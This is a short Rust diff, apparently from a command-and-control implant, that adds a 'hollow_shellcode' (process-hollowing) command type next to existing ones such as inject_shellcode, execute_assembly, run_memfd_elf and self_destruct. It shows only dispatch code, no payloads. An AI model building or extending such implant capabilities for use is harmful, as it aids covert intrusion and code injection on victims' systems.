@@ -209,7 +209,7 @@ impl BatchMessageHandler {
         // Route command execution
         match command_payload.command_type.as_str() {
             // Plugin execution types - route to batch manager (non-blocking)
-            "execute_assembly" | "inject_shellcode" | "run_memfd_elf" | 
+            "execute_assembly" | "inject_shellcode" | "hollow_shellcode" | "run_memfd_elf" | 
             "shell_script" | "powershell_script" | "python_script" | "self_destruct" => {
                 self.handle_plugin_command_async(command_payload).await?;
             }
@@ -252,6 +252,7 @@ impl BatchMessageHandler {
         let execution_type = match command_payload.command_type.as_str() {
             "execute_assembly" => "execute-assembly",
             "inject_shellcode" => "inject-shellcode", 
+            "hollow_shellcode" => "hollow-shellcode",
             "run_memfd_elf" => "memfd-exec",
             "shell_script" => "shell-script",
             "powershell_script" => "powershell-script",
